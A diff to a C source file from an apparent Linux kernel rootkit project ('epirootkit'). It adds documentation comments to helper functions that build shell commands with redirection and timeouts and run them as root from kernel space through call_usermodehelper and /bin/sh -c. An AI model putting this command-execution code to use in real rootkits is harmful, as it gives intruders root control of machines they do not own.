@@ -5,15 +5,32 @@
 
 #include "epirootkit.h"
 
+/**
+ * trim_leading_whitespace - Remove leading whitespace from a string
+ * @str: Input string
+ *
+ * Skips past any leading spaces, tabs, or newline characters.
+ *
+ * Return: Pointer to the first non-whitespace character.
+ */
 static char *trim_leading_whitespace(char *str) {
     while (*str == ' ' || *str == '\t' || *str == '\n')
         str++;
     return str;
 }
 
-// I hate One Direction
+/**
+ * detect_redirections - Detects stdout and stderr redirection in a command string
+ * @cmd: Command string to parse
+ * @redirect_stdout: Set to true if stdout is redirected
+ * @redirect_stderr: Set to true if stderr is redirected
+ *
+ * Scans the command for presence of '>' and '2>' to determine
+ * if stdout or stderr redirection is being used explicitly.
+ */
 static void detect_redirections(const char *cmd, bool *redirect_stdout,
                                 bool *redirect_stderr) {
+    // __evann hates One Redirection
     char *redirect_stderr_add = strstr(cmd, "2>");
     char *redirect_stdout_add = strstr(cmd, ">");
 
@@ -21,6 +38,15 @@ static void detect_redirections(const char *cmd, bool *redirect_stdout,
     *redirect_stdout = (redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL);
 }
 
+/**
+ * build_timeout_prefix - Constructs a timeout command prefix
+ * @timeout: Timeout duration in seconds
+ *
+ * If timeout is greater than 0, constructs a timeout command with signal and status options.
+ *
+ * Return: Dynamically allocated string with the timeout prefix or an empty string.
+ *         Caller must kfree() the returned string.
+ */
 static char *build_timeout_prefix(int timeout) {
     if (timeout <= 0)
         return kstrdup("", GFP_KERNEL);
@@ -35,6 +61,22 @@ static char *build_timeout_prefix(int timeout) {
     return timeout_cmd;
 }
 
+/**
+ * build_full_command - Constructs the full shell command with redirections and timeout
+ * @buffer: Destination buffer to store the final command string
+ * @buffer_size: Size of the destination buffer
+ * @timeout_cmd: Timeout prefix command
+ * @user_cmd: User-supplied command
+ * @redirect_stdout: True if stdout is redirected
+ * @redirect_stderr: True if stderr is redirected
+ * @catch_stds: True if we need to redirect output ourselves
+ * @stdout_file: File to redirect stdout to (if needed)
+ * @stderr_file: File to redirect stderr to (if needed)
+ *
+ * Builds a complete command string to be executed, including output redirection and timeout.
+ *
+ * Return: 0 on success, -EINVAL if the resulting command exceeds buffer size.
+ */
 static int build_full_command(char *buffer, size_t buffer_size,
                               const char *timeout_cmd, const char *user_cmd,
                               bool redirect_stdout, bool redirect_stderr,
@@ -74,6 +116,15 @@ static int build_full_command(char *buffer, size_t buffer_size,
     }
 }
 
+/**
+ * execute_command - Executes a shell command in usermode
+ * @cmd_str: Full shell command string to execute
+ * @envp: Array of environment variables
+ *
+ * Uses call_usermodehelper to execute the provided shell command.
+ *
+ * Return: Exit status of the command, or error code on failure.
+ */
 static int execute_command(const char *cmd_str, char *envp[]) {
     char *argv[] = { "/bin/sh", "-c", (char *)cmd_str, NULL };
     struct subprocess_info *sub_info;
@@ -86,6 +137,17 @@ static int execute_command(const char *cmd_str, char *envp[]) {
     return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
 }
 
+/**
+ * exec_str_as_command_with_timeout - Executes a user command with optional timeout and output redirection
+ * @user_cmd: Command string to execute
+ * @catch_stds: Whether to redirect stdout and stderr to predefined files
+ * @timeout: Timeout in seconds for the command; 0 means no timeout
+ *
+ * Constructs the final command string with timeout and redirection logic,
+ * then executes it in usermode using the kernel's usermodehelper API.
+ *
+ * Return: Exit status of the command, or negative error code on failure.
+ */
 int exec_str_as_command_with_timeout(char *user_cmd, bool catch_stds,
                                      int timeout) {
     char *cmd_buffer = NULL;
